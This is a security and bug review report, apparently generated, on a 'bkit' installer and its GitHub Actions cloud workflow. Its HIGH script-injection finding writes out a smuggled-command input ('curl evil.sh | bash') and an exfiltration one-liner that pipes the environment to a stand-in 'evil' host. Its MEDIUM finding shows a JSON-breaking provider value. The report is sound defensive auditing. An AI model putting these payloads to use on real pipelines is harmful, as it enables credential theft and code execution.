Verdict: CONCERNS
Failures: 0

<!-- verdict:end -->

# Build Challenge — Reconciled Findings

> Partial diff coverage: Large Diff Guard applied (>10 000 diff lines). Four files reviewed in full (`bkit-cloud.yml`, `gateguard.js`, `opencode.json`, `bkit-install.ts` opencode/cloud regions) cross-referenced with `bkit-modules.ts` and `bkit-cli.ts`; remaining surface partially covered. Both reviewers independently flagged this coverage limit — findings are scoped to the reviewed files. No CRITICAL defect found by either lens; max severity HIGH → Verdict CONCERNS.

Reviewers: C1 = Bugs / edge-cases lens. C2 = Security lens. `agreement: {N}/2` counts how many of the two reviewers raised each (post-dedup) finding.

## Findings

### P0 — Block ship

None. Neither lens found a CRITICAL / ship-blocking defect within the reviewed surface.

### P1 — Fix before merge

#### [C2] HIGH — GHA script injection: `inputs.issue` interpolated raw into `run:`

- Lens: Security (C2)
- Severity: HIGH
- Class: mechanical
- Location: `.bkit/templates/.github/workflows/bkit-cloud.yml:346` (opencode job; same shape fed by `:204`/`:212`/`:325`, dispatch input at `:46-48`)
- Exploit scenario: On the `workflow_dispatch` path `ARG="$IN_ISSUE"` from a free-text `type: string` input is written verbatim to `$GITHUB_OUTPUT` then expanded by GitHub Actions at YAML-render time into a double-quoted shell string: `opencode run "/bkit-auto ${{ steps.ctx.outputs.phase }} ${{ steps.ctx.outputs.arg }}"`. A collaborator with workflow-run permission supplies `issue = 1"; curl evil.sh | bash; echo "` (or backticks / `$( )`). The injected command runs in a job holding `contents: write` + `pull-requests: write` + `issues: write` + `GITHUB_TOKEN` + the live `OPENCODE_PROVIDER_KEY` and all fanned-out provider keys, enabling credential exfiltration (`env | curl -d@- evil`). CI path is lower risk (`ARG=$PR_NUMBER` numeric); dispatch path is directly attacker-controlled. Trust boundary is collaborator-vs-collaborator (requires workflow-run permission, not external/anonymous) per `docs/security.md § CI Auto-Route Trust`.
- Suggested fix: Never interpolate `${{ steps.ctx.outputs.* }}` into a `run:` line. Pass `PHASE`/`ARG` through `env:` and reference shell variables (not re-parsed by the expansion engine). Additionally validate `ARG` in the ctx step (`[[ "$ARG" =~ ^[0-9A-Za-z._/-]+$ ]] || exit 1`) since the dispatch input is free-text, and guard `phase` on the CI path (constrained to the `choice` enum only on dispatch).
- agreement: 1/2

#### [C1+C2] HIGH — Provider fan-out block is a static 3-provider list (correctness gap + secret blast radius)

- Lens: Bugs (C1) + Security (C2) — same `file:line`, merged
- Severity: HIGH (both reviewers independently flagged the same fan-out block; C1 rates HIGH for correctness, C2 rates MEDIUM for blast-radius — escalated/held at HIGH per max-wins on the shared root cause)
- Class: architectural (static fan-out diverges from the installer's open-ended provider acceptance)
- Location: `.bkit/templates/.github/workflows/bkit-cloud.yml:341-344` (cross-ref `bkit-cli.ts:274-283`, `bkit-modules.ts:1064-1068`, `bkit-install.ts:1086` PROVIDER_KEYS, advisory `bkit-modules.ts:2512`)
- Exploit scenario:
  - Correctness (C1): `--opencode=<provider>` accepts ANY provider string (no allowlist in `parseArgs`; `renderOpencodeJson` has a generic `${PROVIDER.toUpperCase()}_API_KEY` fallback). The doctor PROVIDER_KEYS table lists `openai` + `anthropic` beyond nvidia/openrouter/gemini, but the cloud workflow only fans `OPENCODE_PROVIDER_KEY` out to `NVIDIA_API_KEY` / `OPENROUTER_API_KEY` / `GEMINI_API_KEY`. `bkit install --opencode=openai` then `--cloud=opencode` commits an opencode.json referencing `${OPENAI_API_KEY}`, which is never set in the job → opencode boots with empty apiKey → auth failure. The advisory's claim of mapping "all known provider env var names" is false for openai/anthropic/custom.
  - Blast radius (C2): the single `OPENCODE_PROVIDER_KEY` is copied into all three SDK env names simultaneously, so the live key is offered to three provider SDKs and every child process (opencode agent has `Bash` allowed, `opencode.json:21-24`). Combined with the HIGH script-injection above, `env | curl` leaks the credential under multiple names.
- Suggested fix: Render the workflow fan-out from the consumer's configured provider `envVar` (`OPENCODE_PROVIDER_DEFAULTS`, `bkit-modules.ts:1028-1049`) and export only that single name — this simultaneously covers any accepted provider (fixes correctness) and removes the multi-SDK blast radius (fixes security). Alternatively (correctness-only) add the remaining PROVIDER_KEYS entries to the fan-out, or hard-error at install when `--cloud=opencode` is requested for an uncovered provider.
- agreement: 2/2

#### [C2] MEDIUM — Unvalidated `--opencode=<provider>` injected into opencode.json via string `.replace`

- Lens: Security (C2) — shares the no-allowlist root cause C1 noted in the fan-out finding; kept separate (distinct sink: `renderOpencodeJson` JSON text vs. workflow env)
- Severity: MEDIUM
- Class: mechanical
- Location: `.bkit/src/bkit-cli.ts:282` (value taken verbatim) → `.bkit/src/bkit-modules.ts:1062-1102` (`renderOpencodeJson`; substitutions `:1082`/`:1083`/`:1065-1067`/`:1066`; failing JSON.parse falls through to raw write at `:1100-1102`)
- Exploit scenario: The provider value is accepted with no allowlist/charset check (`opencodeProvider = value`) and substituted into JSON template text via raw `String.prototype.replace`. A value with a JSON metacharacter (`--opencode=x","evil":"`) is injected unescaped. The `JSON.parse` round-trip only normalises VALID JSON; on broken JSON the `catch` returns the raw malformed string, which is written to `.opencode/opencode.json`. Local/self-inflicted (the operator runs `bkit install` on their own machine) → config-integrity, not privilege escalation. A malformed/over-broad config could silently widen `permission.rules` or set an attacker-chosen `baseURL` (pointing the apiKey at a hostile endpoint = key exfiltration on next run).
- Suggested fix: Validate the provider at parse time against `/^[a-z][a-z0-9-]{0,30}$/` (else `process.exit(1)`), OR build the opencode.json object programmatically and `JSON.stringify` it instead of string-replacing into raw JSON. At minimum, make the `JSON.parse` failure at `:1100` throw instead of writing the malformed string.
- agreement: 1/2

#### [C1] MEDIUM — Orphan-rename of `bkit-auto.yml` loses cloud workflow on upgrade for dev/dogfood snapshots

- Lens: Bugs (C1)
- Severity: MEDIUM
- Class: architectural
- Location: `.bkit/src/bkit-install.ts:1222-1233` (cross-ref `:1186-1219`, `:1166-1170`, `:1198`)
- Exploit scenario: The orphan block deletes `.github/workflows/bkit-auto.yml` on every upgrade. The replacement `bkit-cloud.yml` is an OPT-IN module, so the candidate collector at `:1198` skips it when the dest is absent. A consumer who installed from the unreleased dev snapshot 0bc0779 (has `bkit-auto.yml`, no `bkit-cloud.yml`) runs `pnpm bkit install` without `--cloud` → `bkit-auto.yml` is deleted and `bkit-cloud.yml` is never seeded: the rename is treated as deletion, not migration, silently disabling cloud automation. Released consumers always have `bkit-cloud.yml` (rename never reached main) so they are unaffected — the affected cohort is exactly dev/dogfood/internal repos, where this is dogfooded.
- Suggested fix: Treat the rename as a migration — if `bkit-auto.yml` exists and the consumer is opted into cloud (or just before the opt-in skip), seed `bkit-cloud.yml` from the rendered template before/instead of deleting the old file. Or gate the orphan delete behind "bkit-cloud.yml now present".
- agreement: 1/2

#### [C1] MEDIUM — `--cloud=opencode` precondition passes for an ollama-configured `.opencode/` that cannot run in cloud

- Lens: Bugs (C1)
- Severity: MEDIUM
- Class: architectural
- Location: `.bkit/src/bkit-install.ts:1412-1421` (cross-ref `bkit-modules.ts:1086-1089`)
- Exploit scenario: The precondition only checks `fs.existsSync(.opencode)`. A consumer who ran `--opencode=ollama` has a valid `.opencode/` pointing at `http://localhost:11434/v1` (apiKey `"ollama"`). `--cloud=opencode` is then permitted, but the GitHub runner has no local Ollama server and ollama has no key for the `OPENCODE_PROVIDER_KEY` gate, so the cloud job either no-ops (secret absent) or fails reaching localhost. `bkit install --opencode=ollama` then `--cloud=opencode --tracker=github` succeeds at install but the cloud opencode job can never function.
- Suggested fix: In the `--cloud=opencode` precondition, read `.opencode/opencode.json` and hard-error (or warn) when the configured provider is ollama (or any local/keyless provider), since the cloud runner has no local model host.
- agreement: 1/2

### P2 — Fix preferred

#### [C1] LOW — gateguard deny-mode silently degrades to allow on corrupt state file

- Lens: Bugs (C1)
- Severity: LOW
- Class: mechanical
- Location: `.bkit/templates/.opencode/plugin/gateguard.js:118-126`, `:210-217`
- Exploit scenario: `readState` calls `JSON.parse` without a local try/catch. A corrupt/truncated `$TMPDIR/bkit-gateguard/<session>.json` (interrupted write, disk full) throws a non-GateGuard error, so the outer catch at `:213` does NOT re-throw → fail-open (edit allowed) and the gate is silently skipped for that session until the file is overwritten. Acceptable under the documented fail-open contract, but deny mode is opt-in specifically to block, and a single malformed temp file disables it without any signal. (C2 independently confirmed the top-level fail-open is intentional and deny-mode re-throw is correctly gated on the bkit marker — this LOW is the narrower corrupt-state subcase, not a contradiction.)
- Suggested fix: Wrap the `JSON.parse` in `readState` in try/catch returning `{ files: {} }` on parse failure, so a corrupt file resets cleanly rather than throwing into the fail-open boundary.
- agreement: 1/2

#### [C2] LOW — opencode job: unpinned `curl | bash` installer, missing `set -euo pipefail`

- Lens: Security (C2)
- Severity: LOW
- Class: mechanical
- Location: `.bkit/templates/.github/workflows/bkit-cloud.yml:330-332` and `:345-346`
- Exploit scenario: The "Install opencode" step runs `curl -fsSL https://opencode.ai/install | bash` with no checksum/pin and no `set -euo pipefail` (the dispatch step also omits strict flags; only the `ctx` step has them). A compromise of `opencode.ai/install` (or MITM despite TLS) executes arbitrary code in a job holding repo-write token + provider key. Mirrors an accepted upstream pattern → LOW, but it is an unpinned supply-chain trust point.
- Suggested fix: Pin the installer to a released opencode version and/or verify a published checksum before executing; add `set -euo pipefail` to both `run:` blocks.
- agreement: 1/2

### P3 — Tech debt / info

#### [C1] INFO — opencode slash-command invocation via positional `run` message is unverified vs documented `--command`

- Lens: Bugs (C1)
- Severity: LOW (informational — runtime dependency to confirm, not a confirmed defect)
- Class: mechanical
- Location: `.bkit/templates/.github/workflows/bkit-cloud.yml:346`
- Exploit scenario: The job runs `opencode run "/bkit-auto <phase> <arg>"`, passing a slash command as a positional message. The plan's verify note (`build-plan-verify-5-1.md:14`) records opencode exposes a `--command` option for slash commands while `:15` endorses the positional form. If `run` does not resolve a leading `/name` in the message body as a custom command (treating it as literal prompt text), the orchestrator command never fires and the cloud opencode job runs but never invokes `/bkit-auto`.
- Suggested fix: Confirm against the pinned opencode version; if positional slash resolution is unsupported, switch to `opencode run --command "bkit-auto" -- <phase> <arg>` (or the documented form).
- agreement: 1/2

#### [C1] INFO — opencode and claude jobs may double-act on the same event

- Lens: Bugs (C1)
- Severity: LOW (informational — documented design assumption)
- Class: architectural
- Location: `.bkit/templates/.github/workflows/bkit-cloud.yml:83-96`, `:229-237`
- Exploit scenario: Both jobs share identical `if:` gates and each runs when its respective secret is present (header comments this as intentional/"additive"). If a repo sets BOTH `ANTHROPIC_API_KEY` and `OPENCODE_PROVIDER_KEY`, both orchestrators run `/bkit-auto` for the same phase/arg concurrently. The workflow-level concurrency group does NOT serialise the two agents against each other; cross-agent dedup relies entirely on the orchestrator stale-run guard + status.json lock outside this file.
- Suggested fix: None required if the orchestrator lock is trusted; otherwise document that exactly one cloud secret should be set, or gate opencode off when `ANTHROPIC_API_KEY` is also present.
- agreement: 1/2

#### [C2] INFO — confirmed-safe areas (no action)

- Lens: Security (C2)
- Severity: LOW (informational — verified safe)
- Class: n/a
- Location: `gateguard.js` (`:165-187`, `:206`, `:113-116`, `:210-217`); `bkit-install.ts:1224-1233`; `opencode.json:60` + `bkit-modules.ts:1083-1088`
- Exploit scenario / finding: (1) gateguard advisory hook reads only `tool` name + `args.path`/`args.file_path`, never tool `content`/arguments; output is a static checklist keyed on `path.basename` — no repo content/secret leakage; state keyed by sanitised sessionID in OS temp, never in-repo; `filePath` used only as object key + `path.basename` (no traversal/shell sink). (2) Orphan cleanup path is a hardcoded literal joined to `process.cwd()` with `force: true` targeting one file — no traversal/wildcard. (3) Resolved provider key is NEVER written to disk: opencode.json carries `"apiKey": "${ENV_VAR}"` and `renderOpencodeJson` substitutes only the env-var NAME (ollama special-case writes literal `"ollama"`, no secret) — matches `docs/security.md § Secrets Management`.
- Suggested fix: None — recorded as cleared so the verified-safe surface is not re-litigated. (Note: the orphan-path safety here is the security/traversal question; it does not contradict C1's MEDIUM, which concerns the migration/data-loss behaviour of the same delete.)
- agreement: 1/2

## Overall Verdict: CONCERNS

Recommended strategy: fix-P0-P1
Rationale: No CRITICAL / P0 ship-blocker in either lens within the reviewed surface, so the build is not a FAIL. But there are five actionable P1 items: two HIGH (GHA script-injection on the dispatch path; the static provider fan-out, flagged by BOTH reviewers and held at HIGH) and three MEDIUM (unvalidated provider value injected into opencode.json; orphan-rename data loss for the dev/dogfood cohort that is exactly where this is dogfooded; the ollama cloud precondition gap). The two HIGH items are mechanical-to-architectural but cheap (env-passthrough + render fan-out from the configured `envVar`), and the fan-out fix resolves the C1 correctness gap and the C2 blast-radius finding at once. P2/P3 items (gateguard corrupt-state fail-open, unpinned `curl|bash`, positional slash-command verification, double-act collision) are hardening/tech-debt and can follow. Fix-all is reasonable if cycles allow, but fix-P0-P1 is the minimum gate to merge.
